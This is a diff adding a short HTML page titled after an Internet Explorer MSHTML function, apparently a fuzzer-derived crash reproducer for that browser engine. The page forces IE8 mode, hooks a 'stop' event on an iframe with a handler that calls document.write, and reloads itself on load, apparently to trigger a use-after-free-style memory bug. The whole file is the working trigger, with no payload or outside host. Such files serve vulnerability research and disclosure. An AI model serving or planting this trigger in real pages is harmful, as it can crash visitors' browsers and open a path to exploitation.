@@ -1,0 +1,22 @@
+<html>
+<head>
+<title>MSHTML!CElement::GetPeerMgr</title>
+<meta http-equiv="Cache-Control" content="no-cache"/>
+<script type='text/javascript'>
+function fuzz2(evt)
+{
+document.write("");
+}
+
+function goPANW()
+{
+try{id_1.addEventListener("stop", fuzz2,true);}catch(exception){}
+window.location.href = window.location.href;
+
+}
+</script>
+<body onload='goPANW();'>
+<meta http-equiv="x-ua-compatible" content="IE=8">
+<iframe id=id_1></iframe>
+</body>
+</html>
